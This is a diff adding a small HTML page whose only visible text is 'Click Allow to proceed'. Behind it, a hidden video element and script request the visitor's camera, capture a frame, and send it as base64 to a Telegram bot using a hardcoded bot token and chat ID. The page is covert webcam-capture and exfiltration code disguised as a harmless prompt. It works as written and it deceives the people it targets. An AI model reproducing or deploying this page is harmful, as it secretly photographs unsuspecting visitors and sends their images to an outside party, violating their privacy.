@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title></title>
+  <style>
+    #video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Click Allow to proceed</h1>
+  <video id="video" width="640" height="480" autoplay></video>
+
+  <script>
+    // Get video element
+    const video = document.getElementById('video');
+
+    // Request access to the user's camera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function (stream) {
+        video.srcObject = stream;
+        captureImage();
+      })
+      .catch(function (error) {
+        console.error('Error accessing the camera:', error);
+      });
+
+    // Function to capture an image from the video stream and send to Telegram
+    function captureImage() {
+      // Create a canvas element
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Convert the canvas image to base64 data URL
+      const imageData = canvas.toDataURL('image/png');
+
+      // Send the captured image to the Telegram bot
+      const telegramBotToken = '6216010314:AAEyi1C8zlx7E5UVyky-wSdpazwfSsStKvY';
+      const telegramChatId = '5518916770';
+      const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+
+      fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
+          photo: imageData,
+        }),
+      })
+        .then(function (response) {
+          if (response.ok) {
+            console.log('!');
+          } else {
+            console.error('Failed.');
+          }
+        })
+        .catch(function (error) {
+          console.error('Error :', error);
+        });
+    }
+  </script>
+</body>
+</html>
